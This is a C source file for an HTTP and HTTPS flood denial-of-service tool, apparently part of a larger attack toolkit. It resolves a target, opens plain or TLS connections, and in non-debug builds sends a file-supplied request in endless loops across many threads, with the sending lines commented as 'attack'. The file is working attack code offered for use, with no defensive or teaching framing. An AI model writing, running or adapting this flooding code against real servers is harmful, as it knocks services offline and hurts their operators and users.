#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>

#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netdb.h> // hostent

#include <openssl/ssl.h>
#include <openssl/evp.h>
#include <openssl/err.h>

#include "../main.h"

extern void info(const char *fmt, ...);
extern void warning(const char *fmt, ...);
extern void error(const char *fmt, ...);

#ifdef DEBUG
static int _show_certs(SSL *ssl)
{
    X509 *cert;

    cert = SSL_get_peer_certificate(ssl);
    if (cert)
    {
        char *line;
        warning("server certificates:");
        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
        warning("subject: %s", line);
        free(line);
        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
        warning("issuer: %s", line);
        free(line);
        X509_free(cert);
    }
    else
    {
        error("no certificates found!");
    }
    return 0;
}
#endif

static pIPLIST _get_ip(const char *host)
{
    int i;
    struct hostent *he;
    pIPLIST iplist = (pIPLIST)malloc(sizeof(IPLIST));
    iplist->ip = NULL;
    iplist->next = NULL;
    pIPLIST p = iplist;

    he = gethostbyname(host);
    if (!he)
        error(strerror(errno));

    // for(i = 0; ho->h_aliases[i]; i++){
    //     printf("Aliases %d: %s\n", i + 1, ho->h_aliases[i]);
    // }

    // AF_INET
    // AF_INET6
    if (he->h_addrtype == AF_INET6)
        error("IPv6 is not supported!");

    // IP
    for (i = 0; he->h_addr_list[i]; i++)
    {
        p->ip = inet_ntoa(*((struct in_addr *)he->h_addr_list[i]));
        p->next = (pIPLIST)malloc(sizeof(IPLIST));
        p = p->next;
        p->next = NULL;
        p->ip = NULL;
    }

    return iplist;
}

static int _tcp_create_socket(const char *ip, const int port)
{

    // struct hostent *he;
    struct sockaddr_in server_addr;
    int sock;
    int en = 1;

    server_addr.sin_addr.s_addr = inet_addr(ip);
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1)
    {
        if (errno == 1)
            warning("this program should run as root user!");
        else if (errno == 24)
        {
            warning("you shoud check max file number use 'ulimit -n' in linux.");
            warning("and change the max file number use 'ulimit -n <setting number>'.");
        }
        warning(strerror(errno));
        return -1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &en, sizeof(int)))
    {
        warning(strerror(errno));
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        close(sock);
        warning(strerror(errno));
        return -1;
    }

    return sock;
}

static int _send(const int sock, const char *request, SSL *ssl)
{

    int sent_size = 0;
    int request_size = strlen(request);
    int ret = 0;

    if (!ssl) // http
    {
        while (sent_size < request_size)
        {
            ret = send(sock, request + sent_size, (request_size - sent_size), 0);
            if (ret < 0)
                error(strerror(errno));
            sent_size += ret;
        }
    }
    else // https
    {
        unsigned long written;
        SSL_write_ex(ssl, request, request_size, &written);
        sent_size = written;
    }

    return sent_size;
}

#ifdef DEBUG
static int _recv(const int socket, char **response, SSL *ssl)
{
    // http recv function
    // there has some different between tcp and http recv function

    unsigned long buff_size = 4096;
    int ret = 0;
    char *buff = (char *)malloc(buff_size);
    memset(buff, 0, buff_size);

    if (!ssl) // http
    {
        while (1)
        {
            ret = recv(socket, buff, buff_size, 0);
            if (ret < 0)
                error(strerror(errno));
            else if (ret == 0)
                break;
        }
    }
    else // https
    {
        unsigned long readbytes = 0;
        while (1)
        {
            ret = SSL_read_ex(ssl, buff, buff_size, &readbytes);
            if (ret == 0)
                error("ssl read error: %d", SSL_get_error(ssl, ret));
            else if (ret == 1)
                break;
        }
    }

    (*response) = buff;
    return 0;
}
#endif

static int _http(const char *address, const int port, const char *request)
{
    if (!strlen(address) || !strlen(request))
        error("url or request can not be null!");

    int sock = -1;
    pIPLIST iplist = _get_ip(address);
    pIPLIST p = iplist;
    while (sock < 0)
    {
        sock = _tcp_create_socket(p->ip, port);
        if (sock < 0)
            warning("%s can not connect", p->ip);
        else
            info("%s connected", p->ip);

        if (p->next)
            p = p->next;
        else
            error("no ip can connect");
    }

#ifdef DEBUG
    _send(sock, request, NULL);
    char *response;
    _recv(sock, &response, NULL); // for test
    warning("HTTP response:");
    printf("%s\n", response);
    free(response);
#else
    // while (1) // this code can not run normally in thread
    for (int i = 0; i < 128; i++) // if i = 256, the program will exit with unknow reason
        _send(sock, request, NULL); // attack
#endif

    close(sock);
    return 0;
}

static int _https(const char *address, const int port, const char *request)
{

    if (!strlen(address) || !strlen(request))
        error("url or request can not be null!");

    // 1 create socket
    int sock = -1;
    pIPLIST iplist = _get_ip(address);
    pIPLIST p = iplist;
    while (sock < 0)
    {
        sock = _tcp_create_socket(p->ip, port);
        if (sock < 0)
            warning("%s can not connect", p->ip);
        else
            info("%s connected", p->ip);

        if (p->next)
            p = p->next;
        else
            error("no ip can connect");
    }

    // 2 ssl init
    SSL_CTX *ctx;
    SSL *ssl;
    const SSL_METHOD *method;
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
    method = SSLv23_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx)
    {
        ERR_print_errors_fp(stdout);
        error("ctx create failed");
    }

    // 3 add ssl
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    int ret = SSL_connect(ssl);
    if (ret < 0)
    {
        //int e = SSL_get_error(ssl, ret);
        ERR_print_errors_fp(stdout);
        error("SSL_connect failed, please pay attention to your https port");
    }

#ifdef DEBUG
    warning("connect with %s encryption", SSL_get_cipher(ssl));
    _show_certs(ssl);
    // 4 send data
    _send(sock, request, ssl); // for test
    // 5 recv
    char *response;
    _recv(sock, &response, ssl);
    warning("HTTPS response:");
    printf("%s\n", response);
    free(response);
#else
    while(1)
        _send(sock, request, ssl); // attack
#endif

    // 6 close
    close(sock);
    SSL_CTX_free(ctx);
    return 0;
}

static int _read_file(const char *path, char **config)
{
    int max_buff_size = 4096;
    int cursor = 0;
    char ch;
    char chs1 = '\r';
    char chs2 = '\n';
    char *buff = (char *)malloc(max_buff_size);
    memset(buff, 0, max_buff_size);
    FILE *fp = fopen(path, "r");
    if (!fp)
        error(strerror(errno));

    while (1)
    {
        ch = fgetc(fp);
        if (ch == EOF)
            break;
        else if (ch != '\n')
            buff[cursor++] = ch;
        else
        {
            buff[cursor++] = chs1;
            buff[cursor++] = chs2;
        }
    }
    fclose(fp);
    buff[cursor++] = chs1;
    buff[cursor++] = chs2;

    (*config) = buff;
    return 0;
}

/*
static int _read_file(const char *path, char **data)
{
    int max_buff_size = 4096;
    char *buff = (char *)malloc(max_buff_size);
    memset(buff, 0, max_buff_size);
    FILE *fp = fopen(path, "r");
    if (!fp)
        error(strerror(errno));

    fread(buff, sizeof(char), max_buff_size, fp);
    if (ferror(fp) != 0)
        error(strerror(errno));

    fclose(fp);
    (*data) = buff;
    // printf("%s\n", buff);
    return 0;
}
*/

static void _attack_thread(pHFTP parameters)
{
    char *request;
    _read_file(parameters->http_request_file_path, &request);

    if (parameters->http_or_https == 0)
        while (1)
        {
            _http(parameters->url, parameters->port, request); // attack
        }
    else if (parameters->http_or_https == 1)
        while (1)
            _https(parameters->url, parameters->port, request);

    free(request);
}

int http_flood_attack(char *url, int port, ...)
{
    va_list vlist;
    va_start(vlist, port);
    char *http_content = va_arg(vlist, char *);
    char *https_content = va_arg(vlist, char *);
    int thread_number = va_arg(vlist, int);
    va_end(vlist);

    // http == 0
    // https == 1
    int http_or_https = -1;
    if (strlen(http_content))
        http_or_https = 0;
    else if (strlen(https_content))
        http_or_https = 1;

    pHFTP parameters = (pHFTP)malloc(sizeof(HFTP));
    parameters->url = url;
    parameters->port = port;
    parameters->http_request_file_path = http_content;
    parameters->http_or_https = http_or_https;

#ifndef DEBUG
    pthread_t tid_list[thread_number];
    pthread_attr_t attr;
    int ret, i;
#endif

    if (strlen(url))
    {
        if (strstr(url, "http"))
        {
            error("please use such '192.168.1.1' or 'www.google.com' address format");
        }
    }
    if (port == 0)
    {
        error("please specify a target port");
    }

#ifdef DEBUG
    thread_number++; // meaningless operation, just to avoid warnings from gcc compilation
    _attack_thread(parameters); // test
#else
    for (i = 0; i < thread_number; i++)
    {
        if (pthread_attr_init(&attr))
        {
            error(strerror(errno));
        }
        // if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
        {
            error(strerror(errno));
        }
        // create thread
        ret = pthread_create(&tid_list[i], &attr, (void *)_attack_thread, parameters);
        if (ret != 0)
        {
            error("create pthread failed, ret: %d, %s", ret, strerror(errno));
        }
        pthread_attr_destroy(&attr);
    }
    // pthread_detach(tid);
    // join them all
    for (i = 0; i < thread_number; i++)
    {
        pthread_join(tid_list[i], NULL);
    }
#endif

    return 0;
}
